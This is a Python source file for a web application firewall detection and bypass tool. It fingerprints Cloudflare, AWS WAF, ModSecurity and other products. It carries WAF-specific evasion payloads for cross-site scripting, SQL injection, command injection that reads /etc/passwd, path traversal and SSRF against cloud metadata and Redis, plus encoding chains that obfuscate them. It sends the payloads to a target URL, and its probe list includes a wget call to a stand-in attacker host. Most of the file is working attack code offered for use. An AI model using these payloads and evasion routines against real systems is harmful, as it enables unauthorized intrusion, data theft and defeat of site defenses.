"""WAF detection and bypass module - Identifies WAF type and provides bypass payloads."""

import httpx
import re
from typing import List, Dict, Any, Optional, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed


class WAFBypass:
    """WAF detection and bypass toolkit with encoding chains and WAF-specific payloads."""

    def __init__(self, timeout: int = 10, threads: int = 10):
        """
        Initialize WAFBypass scanner.

        Args:
            timeout: HTTP request timeout in seconds.
            threads: Number of concurrent threads.
        """
        self.timeout = timeout
        self.threads = threads
        self.waf_signatures = self._load_waf_signatures()
        self.bypass_payloads = self._load_bypass_payloads()

    def detect_waf(self, url: str) -> Dict[str, Any]:
        """
        Detect WAF type protecting the target URL.

        Args:
            url: Target URL to probe for WAF detection.

        Returns:
            Dict with waf_detected, waf_type, confidence, and evidence.
        """
        print(f"[*] Detecting WAF on: {url}")
        results = {
            "waf_detected": False,
            "waf_type": "Unknown",
            "confidence": 0,
            "evidence": [],
        }

        # Send normal request for baseline
        baseline = self._request(url)
        if not baseline:
            return results

        # Send malicious request to trigger WAF
        test_payloads = [
            "?id=1' OR '1'='1",
            "?id=<script>alert(1)</script>",
            "?id=../../etc/passwd",
            "?id=;cat /etc/passwd",
            "?cmd=wget+http://evil.com",
        ]

        waf_responses = []
        for payload in test_payloads:
            test_url = url.rstrip("/") + payload
            response = self._request(test_url)
            if response:
                waf_responses.append(response)

        # Analyze responses for WAF signatures
        for response in waf_responses:
            headers_str = str(response.headers).lower()
            body = response.text.lower() if response.text else ""

            for waf_name, signatures in self.waf_signatures.items():
                score = 0
                evidence = []

                for sig_type, patterns in signatures.items():
                    for pattern in patterns:
                        if sig_type == "headers" and pattern.lower() in headers_str:
                            score += 30
                            evidence.append(f"Header match: {pattern}")
                        elif sig_type == "body" and pattern.lower() in body:
                            score += 25
                            evidence.append(f"Body match: {pattern}")
                        elif sig_type == "status" and response.status_code == pattern:
                            score += 15
                            evidence.append(f"Status code: {pattern}")

                if score > results["confidence"]:
                    results["waf_detected"] = True
                    results["waf_type"] = waf_name
                    results["confidence"] = min(score, 100)
                    results["evidence"] = evidence

        if not results["waf_detected"]:
            # Check if any response was blocked
            for response in waf_responses:
                if response.status_code in [403, 406, 429, 503]:
                    results["waf_detected"] = True
                    results["waf_type"] = "Unknown WAF"
                    results["confidence"] = 40
                    results["evidence"] = [f"Blocked with status {response.status_code}"]
                    break

        print(f"[+] WAF Detection: {results['waf_type']} (confidence: {results['confidence']}%)")
        return results

    def get_bypass_payloads(self, waf_type: str, vuln_type: str) -> List[Dict[str, Any]]:
        """
        Get WAF-specific bypass payloads for a vulnerability type.

        Args:
            waf_type: Detected WAF type (e.g., 'Cloudflare', 'ModSecurity').
            vuln_type: Vulnerability type ('xss', 'sqli', 'rce', 'lfi', 'ssrf').

        Returns:
            List of bypass payloads with encoding information.
        """
        waf_key = waf_type.lower().replace(" ", "_")
        payloads = []

        # Get WAF-specific payloads
        if waf_key in self.bypass_payloads and vuln_type in self.bypass_payloads[waf_key]:
            for payload_info in self.bypass_payloads[waf_key][vuln_type]:
                payloads.append(payload_info)

        # Add generic bypass payloads
        if "generic" in self.bypass_payloads and vuln_type in self.bypass_payloads["generic"]:
            for payload_info in self.bypass_payloads["generic"][vuln_type]:
                payloads.append(payload_info)

        # Apply encoding chains
        encoded_payloads = []
        for payload_info in payloads:
            raw = payload_info["payload"]
            encoded_payloads.append(payload_info)

            # Add encoded variants
            for encoding, encoded in self._apply_encoding_chains(raw):
                encoded_payloads.append({
                    "payload": encoded,
                    "encoding": encoding,
                    "description": f"{payload_info.get('description', '')} [{encoding}]",
                    "waf_target": waf_type,
                })

        return encoded_payloads

    def test_bypass(self, url: str, payload: str, encoding: str = "none") -> Dict[str, Any]:
        """
        Test if a bypass payload works against the target.

        Args:
            url: Target URL to test.
            payload: Payload to inject.
            encoding: Encoding to apply ('none', 'url', 'double_url', 'unicode', 'hex', 'base64').

        Returns:
            Dict with success status, response details, and bypass info.
        """
        encoded_payload = self._encode_payload(payload, encoding)

        # Test in URL parameter
        test_url = f"{url.rstrip('/')}?test={encoded_payload}"
        response = self._request(test_url)

        result = {
            "success": False,
            "payload": payload,
            "encoded_payload": encoded_payload,
            "encoding": encoding,
            "url_tested": test_url,
            "status_code": None,
            "response_length": 0,
            "blocked": False,
            "evidence": "",
        }

        if response:
            result["status_code"] = response.status_code
            result["response_length"] = len(response.content)

            if response.status_code in [403, 406, 429, 503]:
                result["blocked"] = True
                result["evidence"] = "Request was blocked by WAF"
            elif response.status_code == 200:
                # Check if payload is reflected (for XSS)
                if payload in response.text or encoded_payload in response.text:
                    result["success"] = True
                    result["evidence"] = "Payload reflected in response"
                else:
                    result["success"] = True
                    result["evidence"] = "Request not blocked (200 OK)"

        return result

    def _apply_encoding_chains(self, payload: str) -> List[Tuple[str, str]]:
        """
        Apply multiple encoding chains to a payload.

        Args:
            payload: Raw payload to encode.

        Returns:
            List of (encoding_name, encoded_payload) tuples.
        """
        chains = []

        # URL encoding
        from urllib.parse import quote
        chains.append(("url_encode", quote(payload, safe="")))

        # Double URL encoding
        chains.append(("double_url_encode", quote(quote(payload, safe=""), safe="")))

        # Unicode encoding
        unicode_payload = ""
        for char in payload:
            unicode_payload += f"%u{ord(char):04x}"
        chains.append(("unicode", unicode_payload))

        # Hex encoding
        hex_payload = "".join(f"%{ord(c):02x}" for c in payload)
        chains.append(("hex", hex_payload))

        # HTML entity encoding
        html_payload = "".join(f"&#{ord(c)};" for c in payload)
        chains.append(("html_entity", html_payload))

        # Mixed case (for keywords)
        if any(kw in payload.lower() for kw in ["select", "union", "script", "alert"]):
            mixed = ""
            for i, c in enumerate(payload):
                mixed += c.upper() if i % 2 == 0 else c.lower()
            chains.append(("mixed_case", mixed))

        # Tab/newline insertion
        tab_payload = payload.replace(" ", "%09")
        chains.append(("tab_replace", tab_payload))

        newline_payload = payload.replace(" ", "%0a")
        chains.append(("newline_replace", newline_payload))

        # Comment insertion (SQL)
        if any(kw in payload.lower() for kw in ["select", "union", "from", "where"]):
            comment_payload = re.sub(r"(\w+)", r"\1/**/", payload)
            chains.append(("sql_comments", comment_payload))

        return chains

    def _encode_payload(self, payload: str, encoding: str) -> str:
        """Apply a specific encoding to a payload."""
        from urllib.parse import quote
        import base64

        encodings = {
            "none": lambda p: p,
            "url": lambda p: quote(p, safe=""),
            "double_url": lambda p: quote(quote(p, safe=""), safe=""),
            "unicode": lambda p: "".join(f"%u{ord(c):04x}" for c in p),
            "hex": lambda p: "".join(f"%{ord(c):02x}" for c in p),
            "base64": lambda p: base64.b64encode(p.encode()).decode(),
            "html_entity": lambda p: "".join(f"&#{ord(c)};" for c in p),
        }

        encoder = encodings.get(encoding, encodings["none"])
        return encoder(payload)

    def _request(self, url: str, method: str = "GET", headers: Dict = None) -> Optional[httpx.Response]:
        """Make an HTTP request with error handling."""
        try:
            with httpx.Client(timeout=self.timeout, verify=False, follow_redirects=True) as client:
                return client.request(method, url, headers=headers or {})
        except Exception:
            return None

    def _load_waf_signatures(self) -> Dict[str, Dict[str, List]]:
        """Load WAF detection signatures."""
        return {
            "Cloudflare": {
                "headers": ["cf-ray", "cf-request-id", "cf-cache-status", "__cfduid", "cloudflare"],
                "body": ["cloudflare", "attention required", "cf-error-details", "ray id"],
                "status": [403, 503],
            },
            "AWS WAF": {
                "headers": ["x-amzn-requestid", "x-amz-cf-id", "x-amz-id-2"],
                "body": ["aws", "request blocked", "automated process"],
                "status": [403],
            },
            "ModSecurity": {
                "headers": ["mod_security", "modsecurity"],
                "body": ["modsecurity", "mod_security", "not acceptable", "rule id"],
                "status": [403, 406],
            },
            "Akamai": {
                "headers": ["akamai", "x-akamai-transformed", "akamai-grn"],
                "body": ["akamai", "access denied", "reference#"],
                "status": [403],
            },
            "Imperva/Incapsula": {
                "headers": ["x-iinfo", "x-cdn", "incap_ses", "visid_incap"],
                "body": ["incapsula", "imperva", "incident id", "_incapsula_resource"],
                "status": [403],
            },
            "F5 BIG-IP ASM": {
                "headers": ["x-wa-info", "bigipserver"],
                "body": ["the requested url was rejected", "please consult with your administrator"],
                "status": [403],
            },
            "Sucuri": {
                "headers": ["x-sucuri-id", "x-sucuri-cache", "sucuri"],
                "body": ["sucuri", "cloudproxy", "access denied - sucuri"],
                "status": [403],
            },
            "Barracuda": {
                "headers": ["barra_counter_session"],
                "body": ["barracuda", "you have been blocked"],
                "status": [403],
            },
            "Fortinet/FortiWeb": {
                "headers": ["fortiwafsid"],
                "body": ["fortigate", "fortiweb", ".fgd_icon"],
                "status": [403],
            },
            "Wordfence": {
                "headers": [],
                "body": ["wordfence", "generated by wordfence", "a potentially unsafe operation"],
                "status": [403],
            },
        }

    def _load_bypass_payloads(self) -> Dict[str, Dict[str, List[Dict[str, str]]]]:
        """Load WAF-specific bypass payloads organized by WAF type and vulnerability."""
        return {
            "cloudflare": {
                "xss": [
                    {"payload": "<svg/onload=alert(1)>", "encoding": "none", "description": "SVG onload"},
                    {"payload": "<img src=x onerror=alert(1)>", "encoding": "none", "description": "IMG onerror"},
                    {"payload": "<details open ontoggle=alert(1)>", "encoding": "none", "description": "Details ontoggle"},
                    {"payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//", "encoding": "none", "description": "Polyglot XSS"},
                    {"payload": "<svg><animate onbegin=alert(1) attributeName=x dur=1s>", "encoding": "none", "description": "SVG animate"},
                ],
                "sqli": [
                    {"payload": "1'/**/oR/**/1=1--", "encoding": "none", "description": "Comment bypass OR"},
                    {"payload": "1'/*!50000union*/select 1,2,3--", "encoding": "none", "description": "Version comment union"},
                    {"payload": "-1' UniOn SeLeCt 1,2,3--", "encoding": "none", "description": "Mixed case union"},
                    {"payload": "1' and 1=1 order by 1--+", "encoding": "none", "description": "Order by injection"},
                    {"payload": "1'||'1'='1", "encoding": "none", "description": "OR with concat"},
                ],
                "rce": [
                    {"payload": ";cat${IFS}/etc/passwd", "encoding": "none", "description": "IFS separator"},
                    {"payload": "|cat</etc/passwd", "encoding": "none", "description": "Input redirect"},
                    {"payload": "$(cat /etc/passwd)", "encoding": "none", "description": "Command substitution"},
                    {"payload": "`cat /etc/passwd`", "encoding": "none", "description": "Backtick execution"},
                ],
                "lfi": [
                    {"payload": "....//....//etc/passwd", "encoding": "none", "description": "Double dot bypass"},
                    {"payload": "/etc/passwd%00", "encoding": "none", "description": "Null byte"},
                    {"payload": "..%252f..%252f..%252fetc/passwd", "encoding": "none", "description": "Double encode"},
                ],
                "ssrf": [
                    {"payload": "http://127.1/", "encoding": "none", "description": "Shortened localhost"},
                    {"payload": "http://0x7f000001/", "encoding": "none", "description": "Hex IP"},
                    {"payload": "http://2130706433/", "encoding": "none", "description": "Decimal IP"},
                ],
            },
            "modsecurity": {
                "xss": [
                    {"payload": "<x/onpointerrawupdate=alert(1)>hover", "encoding": "none", "description": "Pointer event"},
                    {"payload": "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>", "encoding": "none", "description": "Math namespace"},
                    {"payload": "<svg><use href=\"data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><image href='1' onerror='alert(1)'/></svg>#x\">", "encoding": "none", "description": "SVG use"},
                ],
                "sqli": [
                    {"payload": "1'%0aAND%0a1=1--", "encoding": "none", "description": "Newline bypass"},
                    {"payload": "1'%09union%09select%091,2,3--", "encoding": "none", "description": "Tab bypass"},
                    {"payload": "1' /*!union*/ /*!select*/ 1,2,3--", "encoding": "none", "description": "Inline comments"},
                ],
                "rce": [
                    {"payload": "c'a't /etc/passwd", "encoding": "none", "description": "Quote insertion"},
                    {"payload": "c\\at /etc/passwd", "encoding": "none", "description": "Backslash insertion"},
                    {"payload": "/???/??t /???/??????", "encoding": "none", "description": "Glob pattern"},
                ],
                "lfi": [
                    {"payload": "/etc/passwd/..", "encoding": "none", "description": "Trailing dotdot"},
                    {"payload": "....//....//....//etc/passwd", "encoding": "none", "description": "Nested traversal"},
                ],
                "ssrf": [
                    {"payload": "http://[::1]/", "encoding": "none", "description": "IPv6 localhost"},
                    {"payload": "http://localhost.localdomain/", "encoding": "none", "description": "Localdomain"},
                ],
            },
            "aws_waf": {
                "xss": [
                    {"payload": "<img src=1 onerror\\x3dalert(1)>", "encoding": "none", "description": "Hex escape"},
                    {"payload": "<svg/onload=&#97;&#108;&#101;&#114;&#116;(1)>", "encoding": "none", "description": "HTML entities"},
                ],
                "sqli": [
                    {"payload": "1' and/**/ 1=1--", "encoding": "none", "description": "Comment space"},
                    {"payload": "1'%20or%201%3d1--", "encoding": "none", "description": "URL encoded"},
                ],
                "rce": [
                    {"payload": "w`h`o`a`m`i", "encoding": "none", "description": "Backtick split"},
                    {"payload": "/bin/ca?t /etc/pas?wd", "encoding": "none", "description": "Wildcard chars"},
                ],
                "lfi": [
                    {"payload": "..%c0%af..%c0%afetc/passwd", "encoding": "none", "description": "Overlong UTF-8"},
                ],
                "ssrf": [
                    {"payload": "http://169.254.169.254/latest/meta-data/", "encoding": "none", "description": "AWS metadata"},
                    {"payload": "http://[0:0:0:0:0:ffff:169.254.169.254]/", "encoding": "none", "description": "IPv6 mapped"},
                ],
            },
            "generic": {
                "xss": [
                    {"payload": "\"><img src=x onerror=alert(1)>", "encoding": "none", "description": "Break out of attribute"},
                    {"payload": "'-alert(1)-'", "encoding": "none", "description": "JS context break"},
                    {"payload": "<script>alert(String.fromCharCode(88,83,83))</script>", "encoding": "none", "description": "CharCode alert"},
                    {"payload": "javascript:alert(1)//", "encoding": "none", "description": "JS protocol"},
                    {"payload": "<iframe srcdoc='<script>alert(1)</script>'>", "encoding": "none", "description": "Iframe srcdoc"},
                ],
                "sqli": [
                    {"payload": "' OR 1=1--", "encoding": "none", "description": "Classic OR bypass"},
                    {"payload": "' UNION SELECT NULL,NULL,NULL--", "encoding": "none", "description": "Union NULL"},
                    {"payload": "1; WAITFOR DELAY '0:0:5'--", "encoding": "none", "description": "Time-based blind"},
                    {"payload": "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", "encoding": "none", "description": "Sleep injection"},
                    {"payload": "admin'--", "encoding": "none", "description": "Comment auth bypass"},
                ],
                "rce": [
                    {"payload": "; ls -la", "encoding": "none", "description": "Semicolon command"},
                    {"payload": "| whoami", "encoding": "none", "description": "Pipe command"},
                    {"payload": "& ping -c 3 127.0.0.1 &", "encoding": "none", "description": "Background command"},
                    {"payload": "${IFS}cat${IFS}/etc/passwd", "encoding": "none", "description": "IFS bypass"},
                ],
                "lfi": [
                    {"payload": "../../../etc/passwd", "encoding": "none", "description": "Basic traversal"},
                    {"payload": "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", "encoding": "none", "description": "Windows traversal"},
                    {"payload": "php://filter/convert.base64-encode/resource=index.php", "encoding": "none", "description": "PHP filter"},
                    {"payload": "/proc/self/environ", "encoding": "none", "description": "Proc environ"},
                ],
                "ssrf": [
                    {"payload": "http://127.0.0.1/", "encoding": "none", "description": "Localhost"},
                    {"payload": "http://0.0.0.0/", "encoding": "none", "description": "All interfaces"},
                    {"payload": "file:///etc/passwd", "encoding": "none", "description": "File protocol"},
                    {"payload": "dict://127.0.0.1:6379/info", "encoding": "none", "description": "Dict protocol Redis"},
                    {"payload": "gopher://127.0.0.1:25/", "encoding": "none", "description": "Gopher protocol"},
                ],
            },
        }
